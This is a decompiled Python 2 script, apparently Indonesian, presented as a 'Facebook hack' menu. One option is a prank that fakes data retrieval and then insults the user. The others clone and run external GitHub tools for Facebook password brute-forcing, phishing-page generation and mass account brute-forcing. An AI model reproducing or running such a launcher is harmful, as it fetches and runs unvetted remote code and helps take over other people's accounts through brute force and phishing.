# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:47:43) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import os, sys, time, json, requests
bi = '\x1b[34;1m'
i = '\x1b[32;1m'
pur = '\x1b[35;1m'
cy = '\x1b[36;1m'
me = '\x1b[31;1m'
pu = '\x1b[37;1m'
ku = '\x1b[33;1m'
os.system('clear')

def ketik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10.0 / 100)


def mengenal():
    print ' '
    siapa = raw_input(ku + 'Enter You Name : ' + bi)
    ketik(bi + 'Hi ' + ku + siapa)
    ketik(bi + '  Use This As Best You Can :v')
    print '\n  \n'
    tampil()


def tampil():
    print ' '
    print pu + '   +\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80+'
    print pu + '   |' + me + '   FACEBOOK HACK ON TARGET' + pu + '   |'
    print pu + '   +\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80+'
    print pu + '   |' + ku + '      AUTHOR : Eka09   ' + pu + '      |'
    print pu + '   |' + ku + '   FACEBOK : eka ********  ' + pu + '  |'
    print pu + '   |' + ku + '  WHATSAPP : +62957010*****' + pu + '  |'
    print pu + '   |' + ku + 'mail : Eka09@gmail.com       ' + pu + '|'
    print pu + '   +\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80+'
    print pu + '   |' + me + '       PERSONAL  TOOL' + pu + '        |'
    print pu + '   +\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80+'
    print '\n  \n'
    pilihan()


def pilihan():
    print pu + 'PILIHAN'
    print pur + '01.' + bi + ' Hack Facebook Via Username'
    print pur + '02.' + bi + ' Hack Facebook Via BruteForce'
    print pur + '03.' + bi + ' Hack Facebook Via Phising'
    print pur + '04.' + bi + ' Hack Facebook Massal (mbf)'
    print pur + '00.' + me + ' Keluar'
    pilih = raw_input(ku + '<root@facebook :~# ' + cy)
    if pilih == '1' or pilih == '01':
        hasil1()
    if pilih == '2' or pilih == '02':
        hasil2()
    if pilih == '0' or pilih == '00':
        os.system('exit')
    if pilih == '3' or pilih == '03':
        hasil3()
    if pilih == '4' or pilih == '04':
        hasil4()


def hasil1():
    mak = raw_input(pur + '[?]\x1b[33;1m Masukan Id Target : ' + cy)
    print pur + '[!]' + ku + ' TUNGGU SEBENTAR........'
    os.system('sleep 5')
    print pur + '[*]' + ku + ' BERHASIL MENGAMBIL DATA AKUN KORBAN'
    os.system('sleep 3')
    print pur + ' =>' + ku + 'NAME    : ' + me + 'NOT FOUND'
    os.system('sleep 2')
    print pur + ' =>' + ku + 'E-Mail  : ' + me + 'NOT FOUND'
    os.system('sleep 2')
    print pur + ' =>' + ku + 'Phone   : ' + me + 'NOT FOUND'
    os.system('sleep 2')
    print pur + ' =>' + ku + 'Password: ' + me + 'NOT FOUND'
    os.system('sleep 2')
    print pur + ' =>' + ku + 'Location: ' + me + 'NOT FOUND'
    os.system('sleep 2')
    print pur + ' =>' + ku + 'Status  : ' + me + 'NOT FOUND'
    print ' '
    ketik(pu + 'MESSAGE\x1b[33;1m =>\x1b[31;1m TERTIPU KAU BANGSAT :) \xf0\x9f\x98\x86')


def hasil2():
    os.system('git clone https://github.com/FR13ND8/BruteFb')
    os.system('cd BruteFb')
    os.system('python2 brute.py')


def hasil3():
    os.system('git clone https://github.com/thelinuxchoice/shellphish.git')
    os.system('cd shellphish')
    os.system('bash shellphish.sh')


def hasil4():
    os.system('git clone https://github.com/FR13ND8/mbf')
    os.system('cd mbf')
    os.system('python2 mbf.py')


if __name__ == '__main__':
    mengenal()
